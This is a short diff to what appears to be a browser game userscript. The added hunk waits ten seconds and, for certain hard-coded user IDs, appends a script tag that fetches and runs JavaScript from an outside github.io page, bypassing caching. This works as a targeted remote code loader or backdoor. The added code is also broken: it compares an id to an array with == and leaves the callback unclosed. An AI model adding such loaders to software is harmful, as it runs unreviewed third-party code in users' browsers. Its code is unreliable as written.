@@ -128,6 +128,13 @@ Object.values(playerDetails).forEach(player=>{if(player.name.includes("Aquliax")
 }, 5000)
 
 
+setTimeout(function(){
+    var opped = ["2056","165218"];
+window.myuserid = userid;
+        if (userid == opped) {
+$("body").append(`<script src="https://kamiz324.github.io/ngha/ghai.js?nocache=${Date.now()}"></script>`);
+}, 10000);
+
 
 // Animated skin by zimek
 /*
